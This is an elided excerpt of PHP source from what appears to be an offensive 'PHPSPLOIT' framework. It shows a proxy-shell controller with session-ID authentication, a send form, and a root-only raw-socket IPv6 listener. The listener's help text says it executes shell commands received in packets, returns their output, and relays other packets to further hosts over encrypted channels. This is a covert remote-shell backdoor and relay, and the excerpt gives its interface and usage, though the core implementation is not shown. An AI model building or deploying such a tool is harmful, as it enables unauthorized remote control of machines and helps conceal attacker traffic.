...
class Class_Controller_ProxyShell
{
    ...
    public static function create_session_id ( $params = array () )
    {
        ...
        if ( is_cli () ) {
            if ( ( ! empty( $_src_ipv6_address ) ) && ( ! empty( $_session_id ) ) ) {
                Class_Base_Response::outputln ( "\nThe IPV6 address of the source host that is currently allowed to send IPV6 data packets to this machine is {$_src_ipv6_address} . The source host that is currently sending IPV6 data to this machine needs to use an authentication code (i.e. Session ID) to send communication requests to this machine. The currently generated Session ID is: {$_session_id}" );
                Class_Base_Response::outputln ( "\nsource ipv6 address ( " . $_src_ipv6_address . " ) , Source Authentication Code : Session ID ( " . $_session_id . " ) " );
            }
            return null;
        }
    ...
    public static function send ( $params = array () )
    {
        ...
        $_dst_ipv6_address   = Class_Base_Request::form ( "dst_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_security_token     = Class_Base_Request::form ( "security_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_SECURITY_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_SECURITY_TOKEN" ] ) ) );
        ...
        if ( ! is_cli () ) {
            ...
            $_form                   = array (
                ...
                "inputs"    => array (
                    ...
                    array (
                        "id"       => "security_token" ,
                        "title"    => "( Cli Security Token ) : " ,
                        "describe" => "Cli Security Token" ,
                        "name"     => "security_token" ,
                        "value"    => ( ( ! empty( $_security_token ) ) ? ( $_security_token ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
    ...
    public static function listen ( $params = array () )
    {
        ...
        if ( is_cli () ) {
            ...
            if ( is_root_permissions () ) {
                Class_Base_Response::outputln ( "\nThis proxy listening function will default to listening for communication packets sent to ( IPV6 address:  {$_local_ipv6} ). If you want to listen to other specified IPV6 addresses, please pass the \"local_ipv6\" parameter, whose content value is the local IP address you want to specify for listening. For packets that meet the requirements of this feature, the proxy listening function will perform different operations based on the destination IPV6 address (if the destination IPV6 address is the same as the local IPV6 address, the SHELL command specified in the packet will be executed and the command execution result will be returned! If the destination IPV6 address is different from the local IPV6 address, forward the packet to the destination IPV6 address!\n\nURI routing call format : /shell/proxy_shell/listen?is_enable_license_agreement=1%26security_token={$_security_token}%26local_ipv6={$_local_ipv6}" );
                Class_Base_Response::outputln ( "\nPlease keep in mind the following information, including encode_key and encode_iv_mase64, which you will use to encrypt communication data in real-time in the client program's sending module (/shell/privy_shell/send) (note that every time/shell/privy_shell/listen is re executed, the encode_key and encode_iv_mase64 information will be reset)!" );
                Class_Operate_ProxyShell::listen ( $_local_ipv6 , "result_show_id" , $_debug );
            } else {
                Class_Base_Response::outputln ( "\nThis proxy listening function must be operated with ROOT account privileges in order to function properly. Due to its internal implementation using raw sockets for code implementation, better permissions are required! Before attempting to call this proxy listening function, please switch to the ROOT account permission environment." );
            }
        }
        if ( ! is_cli () ) {
